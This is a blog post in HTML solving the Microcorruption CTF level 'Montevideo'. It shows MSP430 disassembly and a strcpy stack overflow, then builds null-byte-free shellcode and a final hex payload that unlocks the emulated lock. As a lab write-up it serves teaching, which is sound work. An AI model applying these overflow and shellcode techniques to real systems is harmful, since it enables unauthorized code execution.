<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> microcorruption - montevideo | #!/slash/note</title>
  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="microcorruption - montevideo" />
<meta property="og:description" content="
     


This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Whitehorse. This challenge is titled Montevideo.
The challenge has the following description when you start:

This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.

Cool. So this one is going to be unbreakable right? Lets see!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://leonjza.github.io/blog/2018/03/08/microcorruption-montevideo/" />
<meta property="article:published_time" content="2018-03-08T18:12:36+02:00" />
<meta property="article:modified_time" content="2018-03-08T18:12:36+02:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="microcorruption - montevideo"/>
<meta name="twitter:description" content="
     


This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Whitehorse. This challenge is titled Montevideo.
The challenge has the following description when you start:

This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.

Cool. So this one is going to be unbreakable right? Lets see!"/>

  
  
  
  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />

  
  
  
  
  
    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-44457032-2', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

    <header id="header">
  <a href="https://leonjza.github.io">
  
    <div id="logo" style="background-image: url(https://leonjza.github.io/images/logo.png)"></div>
  
  <div id="title">
    <h1>#!/slash/note</h1>
  </div>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
      
        <li><a href="https://leonjza.github.io/">Home</a></li>
      
        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
      
    </ul>
  </div>
</header>



    
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <div class="content" itemprop="articleBody">
  
    <figure>
    <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png"/> 
</figure>

<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/">previous challenge</a> called <em>Whitehorse</em>. This challenge is titled <em>Montevideo</em>.</p>
<p>The challenge has the following description when you start:</p>
<blockquote>
<p>This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.</p>
</blockquote>
<p>Cool. So this one is going to be unbreakable right? Lets see!</p>
<h2 id="montevideo">montevideo</h2>
<p>Montevideo follows a similar code pattern when compared to some of the previous challenges we have done where a simple <code>main</code> routine calls <code>login</code>. Looking at <code>login</code> itself we can see a few new things:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">44<span style="color:#50fa7b">f4</span> &lt;login&gt;

[<span style="color:#50fa7b">..</span> typical getsn call to get the password ..]

<span style="color:#6272a4">; strcpy, thats new!
</span><span style="color:#6272a4"></span>451<span style="color:#8be9fd;font-style:italic">a:</span>  <span style="color:#50fa7b">b012</span> dc45      call  <span style="color:#6272a4">#0x45dc &lt;strcpy&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">451</span>e:  <span style="color:#bd93f9">3</span>d40 <span style="color:#bd93f9">6400</span>      mov   <span style="color:#6272a4">#0x64, r13
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4522</span>:  <span style="color:#bd93f9">0</span>e43           clr   r14
4524:  3<span style="color:#50fa7b">f40</span> <span style="color:#bd93f9">0024</span>      mov   <span style="color:#6272a4">#0x2400, r15
</span><span style="color:#6272a4"></span>
<span style="color:#6272a4">; memset is also an interesting one!
</span><span style="color:#6272a4"></span>4528:  <span style="color:#50fa7b">b012</span> f045      call  <span style="color:#6272a4">#0x45f0 &lt;memset&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">452</span>c:  <span style="color:#bd93f9">0</span>f41           mov   sp, r15

<span style="color:#6272a4">; probably checks the password again
</span><span style="color:#6272a4"></span>452<span style="color:#8be9fd;font-style:italic">e:</span>  <span style="color:#50fa7b">b012</span> <span style="color:#bd93f9">4644</span>      call  <span style="color:#6272a4">#0x4446 &lt;conditional_unlock_door&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4532</span>:  <span style="color:#bd93f9">0</span>f93           tst   r15

[<span style="color:#50fa7b">..</span> some messages printed to tell if you unlocked or not ..]

4544:  3150 1000      <span style="color:#50fa7b">add</span>   <span style="color:#6272a4">#0x10, sp
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4548</span>:  <span style="color:#bd93f9">3041</span>           ret
</code></pre></div><p>The calls to <code>strcpy</code> and <code>memset</code> immediately jumped out at me here. I also figured since there is mention of the password size again the bug here might be related to a stack overflow too. To test this, I threw in like 30 <code>A</code>&rsquo;s into the password field to see if the program breaks.</p>
<figure>
    <img src="https://leonjza.github.io/images/microcorruption/montevideo_stack_overflow.png"/> 
</figure>

<blockquote>
<p>insn address unaligned</p>
</blockquote>
<p>Nice! The program counter (<code>pc</code>) has <code>0x4141</code> which most probably comes from our longer-than-its-supposed-to-be password we supplied. With this bug in mind, I quickly had a look at the other routines to see if there is anything interesting happening there. I set up a total of four breakpoints at the following locations:</p>
<ul>
<li><code>0x4510</code> at <code>getsn</code></li>
<li><code>0x451a</code> at <code>strcpy</code></li>
<li><code>0x4528</code> at <code>memset</code></li>
<li><code>0x452e</code> at <code>conditional_unlock_door</code></li>
</ul>
<p>Inspecting these routines manually, as well as the memory layout after each function had me draw the following conclusions:</p>
<ul>
<li>After <code>getsn</code> is done, the password buffer lives at <code>0x2400</code> in memory.</li>
<li>Once <code>strcpy</code> is done, the password buffer at <code>0x2400</code> is copied into a buffer that starts at <code>0x43ef</code>.</li>
<li>After <code>memset</code> is done, the password buffer at <code>0x2400</code> is zeroed out.</li>
<li>After <code>conditional_unlock_door</code> with a too long password buffer, the stack is corrupt and the return address to <code>main</code> overridden.</li>
</ul>
<p>It seems like this challenge is pretty much exactly the same as previous Whitehorse challenge? The <code>conditional_unlock_door</code> routine calls syscall <code>0x7e</code>, so with our overflow this is not a useful location to jump to as the &ldquo;HSM&rdquo; will validate the password. So, like the previous one, we just need a spot to slide in some shellcode.</p>
<p>Before we can supply the shellcode though, we need to find out where we are overriding and corrupting the stack for that <code>ret</code> instruction. For this, I just supplied a bunch of <code>A</code>&rsquo;s and <code>B</code>&rsquo;s and found that at position 17 and 18 again we have control over the programs execution flow.</p>
<figure>
    <img src="https://leonjza.github.io/images/microcorruption/monte_video_ret_control.png"/> 
</figure>

<p>Next, we choose a location in memory where our password buffer is as the address we should jump to (as a result of the <code>ret</code>) which should also be the start of our shellcode. I simply copied the unlock shellcode from <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/">Whitehorse</a> which was <code>30127f00b0123245</code>. The shellcode itself needs a little work though as the address to the <code>INT</code> routine would be different here.</p>
<p>To help with the shellcode modifications we need to do, we can use the assembler/dissasembler provided on microcorruption.com <a href="https://microcorruption.com/assembler">here</a>. Grab the opcodes that form part of our shellcode, paste them into the input box and hit disassemble. Now, with the ASM mnemonics in the input box, update the address to <code>call</code> to <code>0x454c</code> as that is where it lives in this challenge. Finally, hit assemble and be presented with your shellcode :D</p>
<figure>
    <img src="https://leonjza.github.io/images/microcorruption/montevideo_shellcode_1.png"/> 
</figure>

<p>I figured a good spot to jump to our shellcode would be just after the <code>ret</code> address at <code>0x4400</code>, so, my password payload was now going to be:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># ret is 0x4400, so 0044 little endian

[padding to ret] +  [ret] +    [shellcode]
---------------------------------------------
    41 * 16      +  0044  +  30127f00b0124c45 =

# final password payload
41414141414141414141414141414141004430127f00b0124c45
</code></pre></div><p>Sending this password payload, and inspecting the program after a breakpoint at <code>0x4548</code> left the program in a confusing state.</p>
<figure>
    <img src="https://leonjza.github.io/images/microcorruption/montevideo_strcpy_nullbyte.png"/> 
</figure>

<p>It was clear that the jump to <code>0x4400</code> was taken as the program counter (<code>pc</code>) was there, but, my shellcode was missing. Well&hellip; if you have ever dealt with <code>strcpy</code> before, you may have spotted that this was going to happen as soon as I chose <code>0x4400</code> as the address to jump to, as that address contains a nullbyte which is a string terminator for <code>strcpy</code>. Easy fix really, just move along two bytes to avoid a <code>0x00</code> byte in our payload. With a two byte shift, our password payload looks something like this now:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[padding to ret] +  [ret] +  [pad] + [shellcode]
-----------------------------------------------------
    41 * 16      +  0244  +  4242  + 30127f00b0124c45

414141414141414141414141414141410244424230127f00b0124c45
</code></pre></div><figure>
    <img src="https://leonjza.github.io/images/microcorruption/montevideo_null_byte_shellcode.png"/> 
</figure>

<p>Snap. We have made some progress, but there is still a null byte in our shellcode because of the opcodes that form part of the <code>push #0x7f</code> instruction (<code>3012 7f00</code>). We need to get rid of the <code>0x00</code> byte. We can simply modify the shellcode to use any other instructions that will eventually push the value <code>0xf7</code> to the stack. Think of things like moving a large value into a register, performing arithmetic and then moving the resultant register value onto the stack instead of the original value as is.</p>
<p>I used existing instructions in the program as a reference for ideas on how I can modify the shellcode to avoid null bytes. This was the final shellcode I got to work using the disassembler <a href="https://microcorruption.com/assembler">here</a>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#50fa7b">mov</span>     <span style="color:#6272a4">#0x117e, r9
</span><span style="color:#6272a4"></span>sub     <span style="color:#6272a4">#0x10ff, r9
</span><span style="color:#6272a4"></span>push    r9
<span style="color:#50fa7b">call</span>    <span style="color:#6272a4">#0x454c
</span></code></pre></div><p>First, I took a large 2 byte value of <code>0x117e</code> and moved that to <code>r9</code>. I then took a calculator and subtracted the desired value of <code>0x7f</code> from <code>0x117e</code> and got to <code>0x10ff</code>. That resulted in my second instruction of <code>sub #0x10ff, r9</code> which should leave the value <code>0x7f</code> in register <code>r9</code>. Finally, just push <code>r9</code> onto the stack and call <code>INT</code>.</p>
<figure>
    <img src="https://leonjza.github.io/images/microcorruption/montevideo_final_shellcode.png"/> 
</figure>

<p>So now, my final password payload looks as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;print(&#39;41&#39; * 16 + &#39;0244&#39; + &#39;4242&#39; + &#39;39407e113980ff100912b0124c45&#39;)&#34;</span>
<span style="color:#bd93f9">414141414141414141414141414141410244424239407e113980</span>ff100912b0124c45
</code></pre></div><figure>
    <img src="https://leonjza.github.io/images/microcorruption/montevideo_unlock.png"/> 
</figure>

<p>Works! <code>r9</code> ends up as <code>0x7f</code>, pushed to the stack and <code>INT</code> is called to unlock the lock.</p>
<h2 id="solution">solution</h2>
<p>Enter <code>414141414141414141414141414141410244424239407e113980ff100912b0124c45</code> as hex encoded input.</p>
<h2 id="other-challenges">other challenges</h2>
<p>For my other write ups in the microcorruption series, checkout <a href="https://leonjza.github.io/categories/microcorruption/">this</a> link.</p>
  
  </div>
</article>


    <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2020  Leon Jacobs 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="https://leonjza.github.io/">Home</a></li>
         
        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
<script src=https://leonjza.github.io/js/main.js></script>
</html>
